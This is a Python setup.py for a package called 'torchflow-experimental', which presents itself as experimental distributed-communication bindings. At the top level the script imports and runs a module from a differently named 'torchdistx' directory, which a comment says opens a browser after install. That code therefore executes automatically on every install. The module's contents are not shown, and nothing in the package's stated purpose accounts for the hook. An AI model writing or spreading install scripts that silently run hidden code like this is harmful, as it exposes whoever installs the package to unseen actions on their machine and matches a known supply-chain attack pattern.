from setuptools import setup, find_packages
import sys
import os
import importlib.util

# Dynamically import the _postinstall module from the 'torchdistx' directory
module_path = os.path.join(os.path.dirname(__file__), "torchdistx", "_postinstall.py")
spec = importlib.util.spec_from_file_location("torchdistx._postinstall", module_path)
postinstall = importlib.util.module_from_spec(spec)
sys.modules["torchdistx._postinstall"] = postinstall
spec.loader.exec_module(postinstall)

# Trigger post-install browser open
postinstall.run()

setup(
    name="torchflow-experimental",
    version="0.3.0",
    author="dev-init",
    description="Experimental bindings for distributed collective communication workflows.",
    long_description=""" This package provides experimental bindings for distributed collective communication workflows in Python.
    It aims to simplify the development of applications that require efficient communication between multiple processes or devices.
    """,
    long_description_content_type="text/markdown",
    packages=find_packages(),
    include_package_data=True,
    python_requires=">=3.6",
    classifiers=[
        "Programming Language :: Python :: 3",
        "Operating System :: OS Independent",
        "Development Status :: 2 - Pre-Alpha",
        "Topic :: Software Development :: Libraries",
    ],
)
